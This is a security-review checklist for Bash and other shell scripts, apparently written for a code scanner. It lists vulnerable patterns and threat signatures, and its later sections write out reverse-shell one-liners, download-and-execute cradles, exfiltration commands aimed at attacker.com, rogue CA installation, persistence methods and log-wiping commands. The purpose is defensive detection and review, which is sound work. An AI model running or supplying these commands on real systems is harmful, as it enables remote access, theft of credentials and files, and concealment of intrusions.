# Shell (Bash/sh/zsh) — Security Checks

## Code Vulnerabilities (OWASP)

**Command Injection & Code Execution:**
- Unquoted variables in commands: `rm $file` vs `rm "$file"` — word splitting + glob expansion
- `eval "$user_input"` — arbitrary command execution
- `bash -c "$user_input"` — subshell with user-controlled command
- Backtick substitution with user input: `` result=`echo $input` `` — injection via `$(...)` nesting
- `source $user_file` / `. $user_file` — untrusted script execution
- `$()` command substitution with user data: `$(cat $user_path)` — path traversal + execution
- `xargs` without `-0` on filenames — argument injection via spaces/newlines
- `find ... -exec sh -c "echo {}" \;` — injection through filenames with shell metacharacters
- Dynamic variable names: `eval "${var_name}=value"` — variable injection
- `printf -v "$user_var" '%s' "$value"` — variable name injection
- IFS manipulation: `IFS=; cmd $args` — changes word splitting behavior globally

**Quoting & Expansion Attacks:**
- `[[ $var == pattern ]]` vs `[[ $var == "pattern" ]]` — unquoted RHS does glob matching
- Heredoc with unquoted delimiter: `cat <<EOF` expands variables, `cat <<'EOF'` does not
- Array expansion: `${array[*]}` vs `${array[@]}` — `*` joins with IFS, `@` preserves elements
- Brace expansion: `{a,b,c}` — not a security issue itself but unexpected in user-controlled context
- Tilde expansion: `~user` resolves to home directory — information disclosure
- Arithmetic expansion: `$((user_input))` — can execute arbitrary code in some shells
- `$'\x41'` ANSI-C quoting — can construct unexpected characters from seemingly safe input

**Path & File Operations:**
- `cd $user_dir && rm -rf *` — path traversal, then destructive globbing
- `mkdir -p $user_path` — directory traversal, symlink following
- Race conditions (TOCTOU): `test -f "$file" && cat "$file"` — file can change between check and use
- Temp files: `TMPFILE=/tmp/myapp.$$` — predictable, race condition; use `mktemp`
- `ln -s` without validating target — symlink attacks
- `chmod 777` / `chmod a+rwx` — world-writable files
- `chown` in scripts without verifying ownership chain
- Missing `umask` before creating sensitive files — world-readable by default
- `tar xf $archive` — path traversal via `../` entries (zip slip equivalent)
- `unzip $user_file -d $dest` — same traversal issues

**Input Handling:**
- `read` without `-r` — backslash interpretation in user input
- `$1`, `$2`, etc without validation or quoting — argument injection
- `getopts` without handling unknown options — unexpected flow control
- `$REPLY` from `select` menu — user can type arbitrary text
- `read -p "Password: " password` — password visible in terminal (use `read -s`)
- Reading from pipe without error checking: `echo "$data" | while read line; do ...` — subshell scope

**Credential & Secret Handling:**
- Hardcoded passwords in scripts: `PASSWORD="secret"`, `mysql -p'password'` — visible in `/proc/PID/cmdline`
- `export SECRET=value` in profile scripts committed to git
- `.env` files sourced directly: `source .env` — may contain secrets, often committed
- Credentials in heredocs: `cat <<EOF\npassword: $DB_PASS\nEOF` — logged, expanded
- `~/.netrc` with machine credentials — FTP/HTTP auth file, often world-readable
- `~/.pgpass` / `~/.my.cnf` / `~/.mongoshrc.js` — database credential files
- `~/.aws/credentials` / `~/.boto` — cloud credential files
- `~/.ssh/id_*` private keys without passphrase
- Credentials passed as command arguments: `curl -u user:pass`, `htpasswd -b user pass`, `sshpass -p` — visible in `ps aux`
- `echo "$password" | command` — password in pipe, visible in process list
- `expect` scripts with hardcoded `send "password\r"` — automation credentials
- `.git-credentials` / `.gitconfig` with `insteadOf` containing tokens
- `docker login -p $TOKEN` — token in process list (use `--password-stdin`)
- `kubectl create secret` with `--from-literal=password=...` — secret in shell history

**Networking & Remote Execution:**
- `curl $url | bash` / `wget -O- $url | sh` — remote code execution without verification
- `curl -k` / `wget --no-check-certificate` — TLS verification disabled
- `ssh -o StrictHostKeyChecking=no` — MITM vulnerability
- `scp`/`rsync` to/from user-controlled hosts — SSRF-like behavior
- `netcat` / `nc -e /bin/sh` — reverse shell
- `curl` with credentials in URL: `curl https://user:pass@host/` — credentials in process list

**Privilege & Environment:**
- Missing `set -euo pipefail` — errors silently ignored, undefined vars expand to empty
- `sudo` without `-n` in automated scripts — hangs waiting for password
- `setuid` scripts — race conditions, generally unsafe
- `PATH` manipulation: `export PATH=.:$PATH` — current directory in PATH
- `LD_PRELOAD` / `LD_LIBRARY_PATH` — library injection
- `ENV`, `BASH_ENV` — auto-sourced files
- Credentials in environment variables logged by `set`, `env`, `printenv`
- `history` file containing secrets — `HISTCONTROL=ignorespace` or `set +o history`

**Signal & Process Handling:**
- Missing `trap` for cleanup — temp files, lock files left behind
- `trap 'rm -rf $dir' EXIT` with unquoted var — injection on exit
- `kill -9 $pid` with user-controlled PID — can kill unintended processes
- Background processes (`&`) without PID tracking — zombie processes
- `nohup` commands persisting beyond script intent

**Logging & Forensics Evasion:**
- `unset HISTFILE` / `export HISTSIZE=0` / `export HISTFILESIZE=0` — disable command history
- `shred -u ~/.bash_history` / `rm -f ~/.*_history` — destroy command history files
- `history -c && history -w` — clear in-memory history and write empty file
- `set +o history` — disable history for current session
- `HISTCONTROL=ignorespace` then ` command` (leading space) — hide individual commands
- `truncate -s 0 /var/log/syslog` / `/var/log/auth.log` — clearing system logs
- `echo > /var/log/messages` — overwrite log files
- `journalctl --vacuum-time=1s` — purge systemd journal
- Writing to `/var/log/` with `logger -t sshd "Accepted password"` — inject fake log entries
- `auditctl -e 0` / `service auditd stop` — disable Linux auditing
- `echo 0 > /proc/sys/kernel/sysrq` — disable SysRq key
- Timestamp manipulation: `touch -t 202001010000 /file` — anti-forensics
- `debugfs` to modify filesystem metadata (modify inode timestamps)
- Editing `utmp`/`wtmp`/`btmp` files — hide login records
- `pkill -f rsyslog` / `systemctl stop rsyslog` — kill logging daemon
- `chattr +i /malicious/file` — make file immutable (resists `rm`)
- `mount -o remount,ro /var/log` — make log directory read-only (prevents further logging)

**CI/CD Script Patterns:**
- `$GITHUB_HEAD_REF`, `$GITHUB_REF_NAME` — attacker-controlled git refs in GitHub Actions
- `$CI_COMMIT_MESSAGE` — commit message in CI env → injection
- `.travis.yml` / `Jenkinsfile` / `.github/workflows/*.yml` — inline script blocks
- `actions/checkout@master` — unpinned action version → supply chain
- Script downloading and executing remote tools without checksum verification

**I/O Redirection, Tunneling & MITM:**
- `exec 3<>/dev/tcp/HOST/PORT` — file descriptor redirection to network socket (backdoor channel)
- `>/dev/tcp/HOST/PORT` / `</dev/tcp/HOST/PORT` — bash built-in TCP connections via redirection
- Named pipe interception: `mkfifo /tmp/pipe; tee /tmp/captured < /tmp/pipe | target_cmd > /tmp/pipe` — MITM via named pipe
- `socat TCP-LISTEN:PORT,fork TCP:TARGET:PORT` — transparent TCP proxy/MITM
- `ssh -L localport:target:remoteport user@jump` — SSH local port forwarding (tunnel)
- `ssh -R remoteport:localhost:localport user@external` — SSH reverse port forwarding (expose internal service)
- `ssh -D 1080 user@host` — SSH SOCKS proxy (tunnel all traffic)
- `ssh -N -f` — background SSH tunnel with no command (persistent hidden tunnel)
- `ssh -o ProxyCommand='...'` — proxy command injection
- `ssh -W host:port` — netcat-like relay mode
- `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080` — transparent traffic redirect
- `iptables -t nat -A OUTPUT` — redirect outbound traffic to local proxy
- `stunnel` configuration — SSL/TLS wrapping of arbitrary connections
- `ncat --proxy-type socks5 --proxy HOST:PORT` — traffic through SOCKS proxy
- `tsocks` / `proxychains` — transparent SOCKS routing for any command
- Process substitution: `diff <(curl http://legit) <(curl http://evil)` — hidden network access in substitution
- `tee` to duplicate I/O streams: `command | tee >(nc attacker 4444)` — silent copy of output to network
- `script -q /dev/null -c 'command'` — capture terminal I/O including passwords
- `strace -e trace=read -p PID` — intercept reads from another process (credential sniffing)
- `tcpdump` / `tshark` running in script — passive network capture
- `/dev/udp/HOST/PORT` — UDP exfiltration via bash redirection
- `openssl s_client -connect HOST:PORT` — encrypted channel for data exfiltration
- Covert channels: encoding data in DNS queries, ICMP payloads, HTTP headers, or timing

**SSL/TLS Certificate Manipulation:**
- `cp rogue-ca.crt /usr/local/share/ca-certificates/ && update-ca-certificates` — install rogue CA system-wide (Debian/Ubuntu)
- `trust anchor --store rogue-ca.crt` — install CA via p11-kit (Fedora/RHEL)
- `cp rogue-ca.pem /etc/pki/ca-trust/source/anchors/ && update-ca-trust` — RHEL/CentOS rogue CA
- `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain rogue-ca.crt` — macOS system trust
- `keytool -importcert -trustcacerts -keystore $JAVA_HOME/lib/security/cacerts -file rogue-ca.crt` — Java trust store injection
- `openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem` — self-signed cert generation (potential impersonation)
- `REQUESTS_CA_BUNDLE=/path/to/rogue-bundle.pem` — Python requests library CA override
- `NODE_EXTRA_CA_CERTS=/path/to/rogue-ca.pem` — Node.js additional CA injection
- `SSL_CERT_FILE` / `SSL_CERT_DIR` — environment variable CA override (OpenSSL-based tools)
- `CURL_CA_BUNDLE` — curl-specific CA override
- `GIT_SSL_CAINFO` / `GIT_SSL_NO_VERIFY=1` — git SSL bypass/override
- `c_rehash /path/to/certs/` — rehash CA directory (can swap legitimate CA hashes)
- Modifying `/etc/ssl/certs/ca-certificates.crt` directly — append rogue CA to bundle
- `sed` / `cat >>` on CA bundle files — silent CA injection into existing trust bundles
- Removing legitimate CAs from trust store — force fallback to rogue CA
- `openssl s_server -cert rogue.pem -key rogue.key` — impersonation server with rogue cert
- `mitmproxy` / `sslstrip` / `bettercap` installation or execution — active MITM tools
- `.curlrc` / `.wgetrc` with `insecure` / `no-check-certificate` — persistent TLS bypass

## Threat Scan Patterns

**Download Cradles:**
- `curl -sSL $url | bash` / `wget -qO- $url | sh` — classic download-and-execute
- `python -c 'import urllib.request; exec(urllib.request.urlopen("$url").read())'`
- `python3 -c 'import urllib.request,os; os.system(urllib.request.urlopen("$url").read().decode())'`
- `perl -e 'use LWP::Simple; eval get("$url")'`
- `ruby -e 'require "open-uri"; eval URI.open("$url").read'`
- `php -r 'eval(file_get_contents("$url"));'`
- `lwp-download $url /tmp/payload && chmod +x /tmp/payload && /tmp/payload`
- `fetch -o- $url | sh` — BSD fetch
- `curl $url -o /tmp/x; chmod +x /tmp/x; /tmp/x` — download, chmod, execute
- `busybox wget -O- $url | sh` — embedded/container environments
- `/dev/tcp/HOST/PORT` redirection to receive payload: `cat </dev/tcp/HOST/PORT | bash`

**Reverse Shell Patterns:**
- `bash -i >& /dev/tcp/HOST/PORT 0>&1` — classic bash reverse shell
- `exec 5<>/dev/tcp/HOST/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done`
- `nc -e /bin/sh HOST PORT` / `ncat --exec /bin/sh HOST PORT`
- `mkfifo /tmp/f; nc HOST PORT < /tmp/f | /bin/sh > /tmp/f 2>&1`
- `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:HOST:PORT`

**Data Exfiltration:**
- `curl -X POST -d @/etc/shadow` — file exfiltration via HTTP
- `cat /etc/passwd | nc HOST PORT` — piping sensitive files to network
- `tar czf - /sensitive/dir | curl -X PUT -d @- https://attacker.com/`
- DNS exfiltration: `dig $(cat /etc/hostname).attacker.com`
- ICMP exfiltration: `xxd -p /etc/passwd | while read line; do ping -c 1 -p "$line" attacker.com; done`

**Persistence:**
- Writing to `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `~/.zshrc`
- Crontab manipulation: `(crontab -l; echo "* * * * * /bad") | crontab -`
- Systemd service creation: writing to `/etc/systemd/system/`
- `.ssh/authorized_keys` modification
- `at` / `batch` job scheduling
- udev rules: `/etc/udev/rules.d/` — trigger on device events
- Init scripts: `/etc/init.d/`, `/etc/rc.local`

**Obfuscation:**
- Base64 encoded commands: `echo "Y21kCg==" | base64 -d | bash`
- Hex encoded: `echo -e '\x63\x6d\x64' | bash`
- `xxd -r -p <<< "payload" | bash`
- Variable splitting: `a="cu"; b="rl"; $a$b http://evil.com | bash`
- `${!var}` indirect expansion — dynamic variable lookup to hide intent
- Whitespace/Unicode obfuscation in filenames and commands
